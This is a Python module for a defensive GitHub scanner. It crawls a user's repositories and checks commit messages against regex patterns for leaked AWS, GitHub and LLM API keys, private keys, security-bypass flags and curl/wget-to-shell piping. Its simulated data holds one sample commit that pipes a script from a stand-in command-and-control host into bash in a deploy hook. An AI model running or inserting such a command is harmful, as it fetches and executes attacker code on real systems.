"""Autonomous Multi-Repository GitHub Crawler and Commit Security Scanner.

Autonomously enumerates repositories owned by the authenticated user,
extracts recent commit activity, and inspects for secret leaks and malicious diffs.
"""

import logging
import os
import re
from typing import Any

import requests

logger = logging.getLogger("GitHubScanner")

# Patterns for leaked tokens, private keys, and suspicious payloads in commits
SUSPICIOUS_COMMIT_PATTERNS = [
    (r"(?:AKIA|ABIA|ACCA|ASIA)[0-9A-Z]{16}", "AWS Access Key Exposure"),
    (r"ghp_[0-9a-zA-Z]{36}", "GitHub Personal Access Token"),
    (
        r"-----BEGIN (?:RSA|OPENSSH|EC|DSA) PRIVATE KEY-----",
        "Private Cryptographic Key",
    ),
    (
        r"(?:sk-[a-zA-Z0-9]{20,}|nvapi-[a-zA-Z0-9_-]{40,})",
        "High-Privilege LLM API Secret",
    ),
    (r"(?:curl|wget)\s+.*?\b(?:sh|bash)\b", "Malicious Shell Piping Pattern"),
    (
        r"(?:disable_auth|bypass_security|skip_ssl)\s*=\s*(?:true|1)",
        "Security Controls Bypass",
    ),
]

SIMULATED_REPOS_PAYLOAD = {
    "cloud-infrastructure-core": [
        {
            "sha": "a1b2c3d4e5f67890123456789abcdef012345678",
            "author": "devops-engineer",
            "message": "fix: update network security group rules for ingress bastion",
            "url": "https://github.com/user/cloud-infrastructure-core/commit/a1b2c3d",
            "findings": [],
        },
        {
            "sha": "f9e8d7c6b5a43210987654321fedcba098765432",
            "author": "contractor-bot",
            "message": "test: add curl http://malicious-c2.xyz/payload.sh | bash to deploy hook",
            "url": "https://github.com/user/cloud-infrastructure-core/commit/f9e8d7c",
            "findings": ["Malicious Shell Piping Pattern"],
        },
    ],
    "identity-access-service": [
        {
            "sha": "11223344556677889900aabbccddeeff00112233",
            "author": "lead-architect",
            "message": "feat: enforce FIDO2 WebAuthn multi-factor authentication",
            "url": "https://github.com/user/identity-access-service/commit/1122334",
            "findings": [],
        }
    ],
}


def scan_commit_message(message: str) -> list[str]:
    """Scans commit text against sensitive patterns."""
    findings = []
    for pattern, description in SUSPICIOUS_COMMIT_PATTERNS:
        if re.search(pattern, message, re.IGNORECASE):
            findings.append(description)
    return findings


def ingest_all_repos() -> dict[str, Any]:
    """Autonomously fetches repositories and analyzes recent commit streams.

    Uses GITHUB_TOKEN if provided; otherwise returns structured simulated audit data.
    """
    token = os.getenv("GITHUB_TOKEN")
    if not token or token.startswith("insert_") or token == "mock_token":
        logger.info(
            "GITHUB_TOKEN not configured or in mock mode. Executing deterministic repository scan."
        )
        total_repos = len(SIMULATED_REPOS_PAYLOAD)
        total_commits = sum(
            len(commits) for commits in SIMULATED_REPOS_PAYLOAD.values()
        )
        threat_count = sum(
            1
            for commits in SIMULATED_REPOS_PAYLOAD.values()
            for c in commits
            if c.get("findings")
        )
        return {
            "status": "success",
            "source": "deterministic_simulation",
            "total_repositories_scanned": total_repos,
            "total_commits_audited": total_commits,
            "threats_identified": threat_count,
            "repositories": SIMULATED_REPOS_PAYLOAD,
        }

    headers = {
        "Authorization": f"Bearer {token}",
        "Accept": "application/vnd.github.v3+json",
        "User-Agent": "Sentinel-AutoGen-Hunter-MultiRepo-Scanner/1.0",
    }

    try:
        # 1. Fetch user's repositories
        repos_resp = requests.get(
            "https://api.github.com/user/repos?type=owner&per_page=30&sort=updated",
            headers=headers,
            timeout=10,
        )
        repos_resp.raise_for_status()
        repos_data = repos_resp.json()

        ingested_data: dict[str, Any] = {}
        total_threats = 0
        total_commits = 0

        for repo in repos_data:
            repo_name = repo.get("name", "unknown")
            owner = repo.get("owner", {}).get("login", "")
            commits_url = (
                f"https://api.github.com/repos/{owner}/{repo_name}/commits?per_page=5"
            )

            try:
                c_resp = requests.get(commits_url, headers=headers, timeout=5)
                if c_resp.status_code == 200:
                    commits_json = c_resp.json()
                    recent_commits = []
                    for c in commits_json:
                        msg = c.get("commit", {}).get("message", "")
                        findings = scan_commit_message(msg)
                        if findings:
                            total_threats += len(findings)

                        recent_commits.append(
                            {
                                "sha": c.get("sha", "")[:10],
                                "author": c.get("commit", {})
                                .get("author", {})
                                .get("name", "unknown"),
                                "message": msg,
                                "url": c.get("html_url", ""),
                                "findings": findings,
                            }
                        )
                        total_commits += 1

                    ingested_data[repo_name] = recent_commits
            except Exception as exc:
                logger.warning(
                    f"Failed to fetch commits for repository {repo_name}: {exc}"
                )

        return {
            "status": "success",
            "source": "live_github_api",
            "total_repositories_scanned": len(repos_data),
            "total_commits_audited": total_commits,
            "threats_identified": total_threats,
            "repositories": ingested_data,
        }
    except Exception as exc:
        logger.error(f"Failed to execute autonomous GitHub multi-repo crawl: {exc}")
        return {
            "status": "error",
            "error": str(exc),
            "source": "live_github_api_failure",
        }
